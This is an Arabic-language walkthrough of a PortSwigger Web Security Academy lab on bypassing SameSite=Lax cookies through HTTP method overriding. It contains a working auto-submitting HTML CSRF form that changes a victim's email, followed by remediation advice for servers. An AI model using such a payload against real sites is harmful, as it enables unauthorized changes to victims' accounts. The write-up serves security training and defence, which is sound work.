# [SameSite Lax bypass via method override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)

## **`الهدف`**
إنشاء كود `HTML` يقوم بعمل هجوم `CSRF` بحيث يغير الـ `email` الخاص بالضحية.
## **`خطوات الحل`**
**`نفس خطوات حل لاب`** [CSRF vulnerability with no defenses](./CSRF-vulnerability-with-no-defenses.md)

ولكن سنستعمل السكريبت التالي لأن هذا اللاب يمنع `GET` لتعديل البريد الإلكتروني ويسمح فقط بـ `POST` ولكن يمكن التحايل عليها باستخدام `HTTP Method Overriding أو مايعرف بـ Method Spoofing` عن طريق إضافة `_method`.

```html
<form method="GET" action="https://0a35000f0468eb35813f3ef1005800c4.web-security-academy.net/my-account/change-email"> 
    <input type="hidden" name="email" value="test.est@king.com"> 
    <input type="hidden" name="_method" value="POST">
</form> 
<script> 
    document.forms[0].submit(); 
</script>
```
بعد ذلك نقوم بالضغط على `Store` ثم `Deliver exploit to victim` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [CSRF vulnerability with no defenses](./CSRF-vulnerability-with-no-defenses.md)

ويجب إيقاف هذه خاصية `HTTP Method Overriding` تمامًا من إعدادات الـ `Framework` إذا كان تطبيق الويب لا يحتاج فعلياً لمحاكاة طلبات مثل `PUT أو DELETE` عبر نماذج `HTML` (مثلاً إذا كان يستخدم `AJAX/Fetch API` التي تدعم جميع الطلبات بشكل أصلي)،

ويجب برمجة السيرفر بحيث **لا يقبل** الـ `_method` أو `X-HTTP-Method-Override` إلا إذا كان الطلب الأصلي القادم من المتصفح هو `POST`لأن السماح بتحويل `GET` إلى `POST` هو خلل منطقي `Logic Flaw` خطير ينسف حماية `SameSite=Lax`. لأن طلبات `GET`  يجب أن تكون آمنة وغير معدلة للبيانات `Idempotent` أي أنها تُستخدم لجلب البيانات فقط ولا يجب أن تغير بيانات الحساب أبدًا.

ويجب أن يتحقق السيرفر من نوع الطلب الفعلي `Actual HTTP Method` قبل معالجة أي بيانات حيث يتم تعريف مسار `/change-email` وأى مسارات أخرى حساسة في الكود على أنه يقبل `POST` فقط بشكل صارم بما أنه مخصص لاستقبال بيانات حساسة، بحيث لو جاء طلب `GET` يقوم السيرفر برفضه بحالة `405 Method Not Allowed` قبل حتى أن ينظر إلى محتوى الباراميترات مثل `_method`.
